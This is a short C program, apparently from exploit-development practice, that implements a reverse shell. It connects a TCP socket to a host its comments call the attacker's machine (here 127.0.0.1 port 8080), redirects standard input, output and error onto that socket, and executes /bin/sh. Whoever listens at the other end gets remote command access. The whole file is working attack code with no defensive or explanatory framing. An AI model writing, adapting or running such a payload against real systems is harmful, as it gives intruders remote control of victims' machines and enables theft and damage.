#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
 
int main(void)
{
        int clientfd, sockfd, ret;
        int dstport = 8080;
        struct sockaddr_in mysockaddr;
 
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
        mysockaddr.sin_family = AF_INET; //2
        mysockaddr.sin_port = htons(dstport); //8080
        mysockaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //localhost
 
        // connecting to attacker's machine
        ret = connect(sockfd, (struct sockaddr *) &mysockaddr, sizeof(struct sockaddr_in));
        if(ret == -1)
        {
                perror("Attacker's machine is not listening. Quitting!");
                exit(-1);
        }

        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
 
        execve("/bin/sh", NULL, NULL);
        return 0;
}